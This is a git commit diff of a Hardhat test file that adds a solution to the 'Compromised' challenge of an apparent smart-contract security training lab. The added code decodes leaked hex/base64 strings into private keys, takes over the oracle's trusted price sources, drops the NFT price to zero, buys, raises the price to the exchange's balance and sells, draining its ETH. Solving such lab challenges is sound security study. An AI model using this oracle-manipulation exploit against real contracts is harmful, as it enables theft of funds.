0ac8bf8d6ba58fbc9c966c9b3da0323589545e0f
Abdullah Alsigar <abdullah.alsigar@gmail.com>
2024-06-01 12:33:13 +0300

    compromised

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -20,17 +20,17 @@ describe('Compromised challenge', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
-        
+
         // Initialize balance of the trusted source addresses
         for (let i = 0; i < sources.length; i++) {
             setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
             expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
         }
-        
+
         // Player starts with limited balance
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
-        
+
         // Deploy the oracle and setup the trusted sources with initial prices
         const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
         oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
@@ -53,21 +53,63 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const keys = [];
+        const leackedKeys = [
+          '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
+          '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'
+          ].map(e => e.replaceAll(' ', ''));
+        for(let i=0; i<leackedKeys.length; i++) {
+          const k = leackedKeys[i];
+          const key = Buffer.from(Buffer.from(k, 'hex').toString('utf8'), 'base64').toString('utf8');
+          keys.push(key);
+          console.log(`key[${i}]::${key}`);
+        }
+
+        for(let i=0; i<sources.length; i++) {
+          for(let j=0; j<keys.length; j++) {
+            const key = keys[j];
+            const wallet = new ethers.Wallet(key, ethers.provider);
+            try {
+              await oracle.connect(wallet).postPrice('DVNFT', 0);
+            } catch(e) {}
+          }
+        }
+        expect(await oracle.connect(player).getMedianPrice('DVNFT')).to.be.eq(0);
+
+        const buyOneTx = await exchange.connect(player).buyOne({value: 1});
+        const buyOneRes = await buyOneTx.wait();
+        const tokenId = buyOneRes.events.find(event => event.event === 'TokenBought').args.tokenId;
+        console.log(tokenId);
+
+        const exchangeBalance =  await ethers.provider.getBalance(exchange.address);
+        for(let i=0; i<sources.length; i++) {
+          for(let j=0; j<keys.length; j++) {
+            const key = keys[j];
+            const wallet = new ethers.Wallet(key, ethers.provider);
+            try {
+              await oracle.connect(wallet).postPrice('DVNFT', exchangeBalance);
+            } catch(e) {}
+          }
+        }
+        expect(await oracle.connect(player).getMedianPrice('DVNFT')).to.be.eq(exchangeBalance);
+
+        await nftToken.connect(player).approve(exchange.address, tokenId);
+        await exchange.connect(player).sellOne(tokenId);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-        
+
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(exchange.address)
         ).to.be.eq(0);
-        
+
         // Player's ETH balance must have significantly increased
         expect(
             await ethers.provider.getBalance(player.address)
         ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
+
         // Player must not own any NFT
         expect(
             await nftToken.balanceOf(player.address)
